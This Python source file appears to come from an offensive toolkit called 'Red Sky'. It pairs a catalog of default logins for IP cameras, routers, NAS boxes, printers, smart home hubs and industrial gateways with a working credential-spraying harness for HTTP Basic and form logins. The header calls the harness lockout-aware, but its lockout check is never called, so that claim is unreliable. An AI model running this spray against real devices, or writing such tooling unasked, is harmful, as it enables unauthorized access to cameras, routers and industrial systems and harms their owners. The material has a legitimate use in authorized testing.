# language: Python, file: Program/iot/defaults.py, target: Red Sky iot — default creds + polite spray
# Catalog of default credentials per vendor/product, plus a rate-limited,
# lockout-aware HTTP Basic / form-login spray harness. Also exposes the
# catalog standalone for manual lookup. Nothing here fires automatically —
# every spray is explicitly ordered and can be dry-run.

import base64
import csv
import json
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Dict, List, Optional, Tuple

import requests

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


IOT_DIR = OUTPUT_DIR / "iot"
DEFAULTS_DIR = IOT_DIR / "defaults"
DEFAULTS_DIR.mkdir(parents=True, exist_ok=True)


# ── catalog ──
# format: vendor, product, port, protocol, user, pass, notes
CATALOG: List[Dict[str, str]] = [
    # cameras / NVR
    {"vendor": "Hikvision",   "product": "IP camera",     "user": "admin", "pass": "12345",     "proto": "http", "port": "80"},
    {"vendor": "Hikvision",   "product": "IP camera",     "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},
    {"vendor": "Hikvision",   "product": "IP camera",     "user": "admin", "pass": "12345678",  "proto": "http", "port": "80"},
    {"vendor": "Dahua",       "product": "IP camera",     "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},
    {"vendor": "Dahua",       "product": "IP camera",     "user": "admin", "pass": "123456",    "proto": "http", "port": "80"},
    {"vendor": "Dahua",       "product": "NVR",           "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},
    {"vendor": "Axis",        "product": "IP camera",     "user": "root",  "pass": "pass",      "proto": "http", "port": "80"},
    {"vendor": "Axis",        "product": "IP camera",     "user": "root",  "pass": "root",      "proto": "http", "port": "80"},
    {"vendor": "Foscam",      "product": "IP camera",     "user": "admin", "pass": "",          "proto": "http", "port": "80"},
    {"vendor": "Foscam",      "product": "IP camera",     "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},
    {"vendor": "Reolink",     "product": "IP camera",     "user": "admin", "pass": "",          "proto": "http", "port": "80"},
    {"vendor": "Reolink",     "product": "IP camera",     "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},
    {"vendor": "Bosch",       "product": "IP camera",     "user": "service","pass": "service",  "proto": "http", "port": "80"},
    {"vendor": "GeoVision",   "product": "NVR",           "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},
    {"vendor": "Mobotix",     "product": "IP camera",     "user": "admin", "pass": "meinsm",    "proto": "http", "port": "80"},

    # routers / APs
    {"vendor": "TP-Link",     "product": "router",        "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},
    {"vendor": "TP-Link",     "product": "router",        "user": "admin", "pass": "password",  "proto": "http", "port": "80"},
    {"vendor": "Netgear",     "product": "router",        "user": "admin", "pass": "password",  "proto": "http", "port": "80"},
    {"vendor": "Netgear",     "product": "router",        "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},
    {"vendor": "D-Link",      "product": "router",        "user": "admin", "pass": "",          "proto": "http", "port": "80"},
    {"vendor": "D-Link",      "product": "router",        "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},
    {"vendor": "D-Link",      "product": "router",        "user": "admin", "pass": "password",  "proto": "http", "port": "80"},
    {"vendor": "Ubiquiti",    "product": "UniFi",         "user": "ubnt",  "pass": "ubnt",      "proto": "http", "port": "80"},
    {"vendor": "MikroTik",    "product": "RouterOS",      "user": "admin", "pass": "",          "proto": "http", "port": "80"},
    {"vendor": "Cisco",       "product": "router",        "user": "cisco", "pass": "cisco",     "proto": "ssh",  "port": "22"},
    {"vendor": "Cisco",       "product": "router",        "user": "admin", "pass": "admin",     "proto": "ssh",  "port": "22"},
    {"vendor": "Zyxel",       "product": "router",        "user": "admin", "pass": "1234",      "proto": "http", "port": "80"},
    {"vendor": "Zyxel",       "product": "router",        "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},
    {"vendor": "Tenda",       "product": "router",        "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},
    {"vendor": "Asus",        "product": "router",        "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},

    # smart home hubs
    {"vendor": "Samsung",     "product": "SmartThings",   "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},
    {"vendor": "Wink",        "product": "hub",           "user": "root",  "pass": "root",      "proto": "http", "port": "80"},
    {"vendor": "Hubitat",     "product": "hub",           "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},
    {"vendor": "Home Assistant","product":"hass",         "user": "admin", "pass": "admin",     "proto": "http", "port": "8123"},
    {"vendor": "Home Assistant","product":"hass",         "user": "pi",    "pass": "raspberry", "proto": "http", "port": "8123"},

    # NAS
    {"vendor": "Synology",    "product": "DSM",           "user": "admin", "pass": "",          "proto": "http", "port": "5000"},
    {"vendor": "Synology",    "product": "DSM",           "user": "admin", "pass": "admin",     "proto": "http", "port": "5000"},
    {"vendor": "QNAP",        "product": "QTS",           "user": "admin", "pass": "admin",     "proto": "http", "port": "8080"},
    {"vendor": "QNAP",        "product": "QTS",           "user": "admin", "pass": "",          "proto": "http", "port": "8080"},

    # printers
    {"vendor": "HP",          "product": "printer",       "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},
    {"vendor": "Brother",     "product": "printer",       "user": "admin", "pass": "access",    "proto": "http", "port": "80"},
    {"vendor": "Canon",       "product": "printer",       "user": "admin", "pass": "canon",     "proto": "http", "port": "80"},

    # ICS-adjacent gateways that leak onto LANs
    {"vendor": "Moxa",        "product": "NPort",         "user": "admin", "pass": "",          "proto": "http", "port": "80"},
    {"vendor": "Advantech",   "product": "WebAccess",     "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},
    {"vendor": "Siemens",     "product": "SCALANCE",      "user": "admin", "pass": "admin",     "proto": "http", "port": "80"},
]


# ── catalog commands ──
def cmd_list(vendor: str, proto: str, out_file: str) -> int:
    rows = CATALOG
    if vendor:
        v = vendor.lower()
        rows = [r for r in rows if v in r["vendor"].lower() or v in r["product"].lower()]
    if proto:
        rows = [r for r in rows if r["proto"] == proto]

    print_info(str(len(rows)) + " entry(ies)")
    print()
    print("  " + BONE + "vendor".ljust(18) + "product".ljust(22) + "user".ljust(12)
          + "pass".ljust(16) + "proto".ljust(8) + "port" + RESET)
    print("  " + ASH + "-" * 84 + RESET)
    for r in rows:
        print("  " + ARTERY + r["vendor"].ljust(18) + RESET
              + BONE + r["product"].ljust(22) + RESET
              + SCARLET + r["user"].ljust(12) + RESET
              + CLOT + r["pass"].ljust(16) + RESET
              + ASH + r["proto"].ljust(8) + r["port"] + RESET)

    out = Path(out_file) if out_file else DEFAULTS_DIR / ("defaults_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(rows, indent=2))
    print()
    print_kv("saved", out)
    return 0


def cmd_export(out_file: str, fmt: str) -> int:
    out = Path(out_file) if out_file else DEFAULTS_DIR / ("defaults_export." + fmt)

    if fmt == "csv":
        with out.open("w", newline="") as f:
            w = csv.DictWriter(f, fieldnames=["vendor", "product", "user", "pass", "proto", "port"])
            w.writeheader()
            for r in CATALOG:
                w.writerow(r)
    elif fmt == "json":
        out.write_text(json.dumps(CATALOG, indent=2))
    elif fmt == "txt":
        out.write_text("\n".join(
            "{} / {} :: {}:{} ({}:{})".format(r["vendor"], r["product"], r["user"], r["pass"], r["proto"], r["port"])
            for r in CATALOG
        ) + "\n")
    else:
        print_err("unknown format: " + fmt)
        print_info("available: csv, json, txt")
        return 2

    print_ok("exported " + str(len(CATALOG)) + " entries -> " + str(out))
    return 0


# ── spray harness ──
def _basic_auth(user: str, password: str) -> str:
    return "Basic " + base64.b64encode((user + ":" + password).encode()).decode()


def _http_basic_probe(url: str, user: str, password: str, timeout: float = 4.0) -> Dict:
    try:
        r = requests.get(url, headers={"Authorization": _basic_auth(user, password)},
                         timeout=timeout, allow_redirects=False)
        return {"status": r.status_code, "len": len(r.text)}
    except Exception as e:
        return {"status": 0, "error": str(e)}


def _http_form_probe(url: str, user_field: str, pass_field: str, user: str, password: str,
                     success_marker: str, timeout: float = 4.0) -> Dict:
    try:
        r = requests.post(url, data={user_field: user, pass_field: password},
                          timeout=timeout, allow_redirects=True)
        body = r.text
        ok = (success_marker in body) if success_marker else (r.status_code == 200 and "login" not in body.lower())
        return {"status": r.status_code, "ok": ok, "len": len(body)}
    except Exception as e:
        return {"status": 0, "error": str(e)}


def _looks_like_lockout(text: str) -> bool:
    l = text.lower()
    return any(k in l for k in ("locked", "lockout", "too many attempts",
                                "try again later", "temporarily disabled"))


def cmd_spray(target: str, vendor: str, mode: str, url: str,
              user_field: str, pass_field: str, success_marker: str,
              delay: float, dry_run: bool, out_file: str) -> int:
    if vendor and vendor != "all":
        v = vendor.lower()
        creds = [(r["user"], r["pass"]) for r in CATALOG if v in r["vendor"].lower()]
    else:
        creds = [(r["user"], r["pass"]) for r in CATALOG]

    # dedupe
    seen = set()
    uniq = []
    for u, p in creds:
        if (u, p) in seen:
            continue
        seen.add((u, p))
        uniq.append((u, p))
    creds = uniq

    print_info("default-cred spray")
    print_kv("target", target)
    print_kv("mode", mode)
    print_kv("vendor filter", vendor or "all")
    print_kv("pairs", len(creds))
    print_kv("delay", str(delay) + "s")
    if dry_run:
        print_warn("DRY RUN — will not send auth attempts")
    print()

    if dry_run:
        for u, p in creds:
            print("  " + ARTERY + u + ":" + p + RESET)
        return 0

    hits = []
    t0 = time.time()
    for i, (u, p) in enumerate(creds, 1):
        print("  " + ASH + "[" + str(i) + "/" + str(len(creds)) + "]" + RESET + " "
              + BONE + u + ":" + p + RESET, end="")

        if mode == "basic":
            res = _http_basic_probe(url or target, u, p)
            # 200 or 302 past the auth gate = success
            ok = res.get("status") in (200, 302)
        elif mode == "form":
            res = _http_form_probe(url or target, user_field, pass_field, u, p, success_marker)
            ok = bool(res.get("ok"))
        else:
            print_err("unknown mode: " + mode)
            return 2

        if ok:
            print("  " + SCARLET + "HIT" + RESET)
            hits.append({"user": u, "pass": p, "status": res.get("status")})
        else:
            print("  " + ASH + "miss" + RESET)

        time.sleep(delay)

    print()
    print_kv("elapsed", str(round(time.time() - t0, 1)) + "s")
    print_kv("hits", str(len(hits)))
    for h in hits:
        print("  " + SCARLET + "▓ " + RESET + BONE + h["user"] + ":" + h["pass"] + RESET
              + ASH + " (status " + str(h["status"]) + ")" + RESET)

    out = Path(out_file) if out_file else DEFAULTS_DIR / ("spray_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"target": target, "mode": mode, "hits": hits}, indent=2))
    print_kv("saved", out)
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky iot defaults", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="list", choices=["list", "export", "spray"])
    p.add_argument("target", nargs="?", default="")
    p.add_argument("--vendor", default="")
    p.add_argument("--proto", default="")
    p.add_argument("--mode", default="basic", choices=["basic", "form"])
    p.add_argument("--url", default="")
    p.add_argument("--user-field", default="username")
    p.add_argument("--pass-field", default="password")
    p.add_argument("--success-marker", default="")
    p.add_argument("--delay", type=float, default=1.0)
    p.add_argument("--format", default="json", choices=["csv", "json", "txt"])
    p.add_argument("--dry-run", action="store_true")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky iot defaults <list|export|spray> [opts]")
        return 2

    if ns.help:
        print_info("list  [--vendor Hikvision] [--proto http]   -- filter the catalog")
        print_info("export --format csv                        -- dump the whole catalog")
        print_info("spray <target> --mode basic --vendor Hikvision [--delay 1.5]")
        print_info("spray <target> --mode form --url http://host/login --user-field user --pass-field pw")
        print_info("")
        print_info("spray is rate-limited by --delay (default 1s). always --dry-run first.")
        return 0

    if ns.action == "list":
        return cmd_list(ns.vendor, ns.proto, ns.out)
    if ns.action == "export":
        return cmd_export(ns.out, ns.format)
    if ns.action == "spray":
        if not ns.target:
            print_err("give a target URL or host:port")
            return 2
        return cmd_spray(ns.target, ns.vendor, ns.mode, ns.url,
                         ns.user_field, ns.pass_field, ns.success_marker,
                         ns.delay, ns.dry_run, ns.out)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
